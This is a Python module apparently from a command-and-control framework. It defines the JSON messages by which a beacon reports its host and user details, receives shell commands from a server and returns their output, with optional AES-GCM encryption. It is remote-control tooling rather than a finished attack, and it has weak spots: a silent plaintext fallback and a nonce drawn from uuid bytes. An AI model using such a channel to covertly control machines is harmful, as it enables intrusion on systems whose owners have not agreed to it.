"""C2 communication protocol.

All messages are JSON objects sent over HTTP.  Binary payloads (e.g. command
output containing non-UTF-8 bytes) are base64-encoded and the ``encoding``
field is set to ``"base64"``.

Optional symmetric encryption uses AES-256-GCM.  When a session is encrypted
the entire inner JSON payload is encrypted and the wire format becomes::

    {
        "type": "encrypted",
        "session_id": "<uuid>",
        "nonce": "<base64>",
        "ciphertext": "<base64>"
    }

The server and beacon negotiate a pre-shared key (PSK) out-of-band; it is
stored as a plain string and converted to a 32-byte key via SHA-256 before
each operation.

Message types
-------------
checkin
    Beacon → server.  Periodic heartbeat that also retrieves any pending task.

task
    Server → beacon (returned in checkin response).  A shell command to run.

result
    Beacon → server.  Output and exit code of a completed task.

ack
    Server → beacon.  Generic acknowledgement / empty task response.
"""
from __future__ import annotations

import base64
import hashlib
import json
import time
import uuid
from dataclasses import dataclass, field, asdict
from typing import Optional


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _b64_encode(data: bytes) -> str:
    return base64.b64encode(data).decode()


def _b64_decode(data: str) -> bytes:
    return base64.b64decode(data)


def _derive_key(psk: str) -> bytes:
    """Derive a 32-byte AES key from an arbitrary-length pre-shared key."""
    return hashlib.sha256(psk.encode()).digest()


def encrypt_message(payload: dict, psk: str) -> dict:
    """Return an encrypted wire message wrapping *payload*.

    Uses AES-256-GCM.  Requires the ``cryptography`` package; if it is not
    installed the payload is returned as-is (plain-text) with a warning field.
    """
    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM  # type: ignore
    except ImportError:
        payload["_encryption_unavailable"] = True
        return payload

    key = _derive_key(psk)
    nonce = uuid.uuid4().bytes[:12]
    aesgcm = AESGCM(key)
    plaintext = json.dumps(payload).encode()
    ciphertext = aesgcm.encrypt(nonce, plaintext, None)
    session_id = payload.get("session_id", "")
    return {
        "type": "encrypted",
        "session_id": session_id,
        "nonce": _b64_encode(nonce),
        "ciphertext": _b64_encode(ciphertext),
    }


def decrypt_message(wire: dict, psk: str) -> dict:
    """Decrypt an encrypted wire message and return the inner payload dict."""
    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM  # type: ignore
    except ImportError:
        raise RuntimeError("cryptography package required for encrypted sessions")

    key = _derive_key(psk)
    nonce = _b64_decode(wire["nonce"])
    ciphertext = _b64_decode(wire["ciphertext"])
    aesgcm = AESGCM(key)
    plaintext = aesgcm.decrypt(nonce, ciphertext, None)
    return json.loads(plaintext.decode())


# ---------------------------------------------------------------------------
# Message dataclasses
# ---------------------------------------------------------------------------

@dataclass
class CheckinMessage:
    """Sent by the beacon to the server on each interval."""
    type: str = "checkin"
    session_id: str = field(default_factory=lambda: str(uuid.uuid4()))
    hostname: str = ""
    platform: str = ""
    username: str = ""
    timestamp: float = field(default_factory=time.time)

    def to_dict(self) -> dict:
        return asdict(self)

    @staticmethod
    def from_dict(d: dict) -> "CheckinMessage":
        return CheckinMessage(
            type=d.get("type", "checkin"),
            session_id=d.get("session_id", ""),
            hostname=d.get("hostname", ""),
            platform=d.get("platform", ""),
            username=d.get("username", ""),
            timestamp=d.get("timestamp", 0.0),
        )


@dataclass
class TaskMessage:
    """Sent by the server to the beacon in response to a checkin."""
    type: str = "task"
    session_id: str = ""
    task_id: str = field(default_factory=lambda: str(uuid.uuid4()))
    command: str = ""

    def to_dict(self) -> dict:
        return asdict(self)

    @staticmethod
    def from_dict(d: dict) -> "TaskMessage":
        return TaskMessage(
            type=d.get("type", "task"),
            session_id=d.get("session_id", ""),
            task_id=d.get("task_id", ""),
            command=d.get("command", ""),
        )


@dataclass
class ResultMessage:
    """Sent by the beacon after executing a task."""
    type: str = "result"
    session_id: str = ""
    task_id: str = ""
    output: str = ""
    encoding: str = "utf-8"
    exit_code: int = 0
    timestamp: float = field(default_factory=time.time)

    def to_dict(self) -> dict:
        return asdict(self)

    @staticmethod
    def from_dict(d: dict) -> "ResultMessage":
        return ResultMessage(
            type=d.get("type", "result"),
            session_id=d.get("session_id", ""),
            task_id=d.get("task_id", ""),
            output=d.get("output", ""),
            encoding=d.get("encoding", "utf-8"),
            exit_code=d.get("exit_code", 0),
            timestamp=d.get("timestamp", 0.0),
        )

    def decoded_output(self) -> str:
        """Return the command output as a plain string."""
        if self.encoding == "base64":
            return _b64_decode(self.output).decode("utf-8", errors="replace")
        return self.output


@dataclass
class AckMessage:
    """Server response when there is no pending task."""
    type: str = "ack"
    session_id: str = ""

    def to_dict(self) -> dict:
        return asdict(self)
